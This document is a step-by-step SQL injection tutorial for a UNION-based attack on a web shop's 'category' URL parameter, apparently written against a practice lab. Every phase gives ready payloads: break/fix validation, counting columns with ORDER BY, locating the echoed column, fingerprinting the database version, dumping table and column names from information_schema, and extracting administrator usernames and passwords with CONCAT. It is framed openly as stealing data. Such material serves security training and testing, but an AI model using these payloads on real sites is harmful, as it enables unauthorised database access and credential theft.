# Union Attack Workflow

**Objective:** To map the internal structure of a database and extract sensitive tables by appending a malicious query to a legitimate query, forcing the application to print our stolen data directly onto the webpage.

---

##  Phase 1: Identification & Validation
Before attempting a UNION attack, you must confirm that your input is actively modifying the database query and that the results are reflected on the screen.

**1. The Break/Fix Test:**
* **Break it:** `?category=Gifts'` -> *Result:* The page breaks, images disappear, or an error is thrown. 
* **Fix it:** `?category=Gifts'--+` -> *Result:* The page loads normally again (because you successfully commented out the broken syntax).
* *Conclusion:* The injection point is validated.

---

## Phase 2: Determining the Column Count
To use the `UNION` operator, your injected query MUST ask for the exact same number of columns as the developer's original query.

**The `ORDER BY` Methodology:**
You ask the database to sort the results by column number. You increment the number until the database throws an error (because you asked it to sort by a column that doesn't exist).

* `?category=Gifts' ORDER BY 1--+` *(Loads normally)*
* `?category=Gifts' ORDER BY 2--+` *(Loads normally)*
* `?category=Gifts' ORDER BY 3--+` *(Loads normally)*
* `?category=Gifts' ORDER BY 4--+` *(Page breaks / throws an error)*

**Conclusion:** The query broke at 4, which means **the table has exactly 3 columns.**

---

## Phase 3: Finding the "Echo" Column
Now that you know the query has 3 columns, you must figure out which of those columns actually prints data to the visual webpage. Some columns (like an internal `id`) are processed in the background but never displayed.

**The `NULL` to String Test:**
Construct a UNION query using `NULL` for all columns (since `NULL` is accepted by all data types). Then, systematically replace `NULL` with a recognizable string.

* **Payload:** `?category=Gifts' UNION SELECT 'Column1', 'Column2', 'Column3'--+`
* **Observation:** Look at the webpage. If you see the text "Column2" appear where a product name or description usually sits, you have found your injection point. 
* **Conclusion:** Column 2 is the "Echo" column. We will put our malicious payloads *only* in Column 2.

---

## Phase 4: Database Fingerprinting
Before dumping tables, you need to know what database engine you are attacking so you can use the correct syntax.

* **Payload:** `?category=Gifts' UNION SELECT NULL, @@version, NULL--+`
* *(If it fails, try the MySQL/Postgres variant: `version()`)*
* **Observation:** The webpage prints something like `5.7.34-0ubuntu0.18.04.1`. 
* **Conclusion:** We are attacking a MySQL database.

---

## Phase 5: Schema Mapping (The Blueprints)
You cannot steal a password if you don't know the name of the table or the column it lives in. We will interrogate the `information_schema` (the database's internal dictionary).

**1. Dump the Table Names:**
* **Payload:** `?category=Gifts' UNION SELECT NULL, table_name, NULL FROM information_schema.tables--+`
* **Observation:** A list of tables prints to the screen. You spot one named `administrator_users`.

**2. Dump the Column Names (for 'administrator_users'):**
* **Payload:** `?category=Gifts' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name = 'administrator_users'--+`
* **Observation:** The page prints the columns for that table. You see `id`, `admin_name`, and `admin_pass`.

---

## Phase 6: Systematic Data Exfiltration
You have the blueprints. Now, extract the target data.

**The Extraction Payload:**
* **Payload:** `?category=Gifts' UNION SELECT NULL, admin_name, NULL FROM administrator_users--+`
* *(Repeat for `admin_pass`)*

**Pro-Tip: Concatenation (Efficiency)**
Instead of doing two separate attacks to get the username and the password, use string concatenation to glue them together into your single echo column.

* **Payload:** `?category=Gifts' UNION SELECT NULL, CONCAT(admin_name, ' ~ ', admin_pass), NULL FROM administrator_users--+`
* **Result:** The webpage prints: `admin ~ SuperSecretPassword123`

---

## Common Pitfalls
1. **Invisible Output:** Sometimes the UNION query works perfectly, but the webpage only displays the *first* row of results (the legitimate data), hiding your injected data.
    * *The Fix:* Make the original query mathematically False so it returns nothing, forcing the webpage to *only* display your UNION data. 
    * *Example:* `?category=DOES_NOT_EXIST' UNION SELECT NULL, @@version, NULL--+`
2. **Data Type Errors:** If replacing a `NULL` with a string (like 'Column1') breaks the page, that specific column might be strictly typed as an Integer. Leave it as `NULL` and try the next column.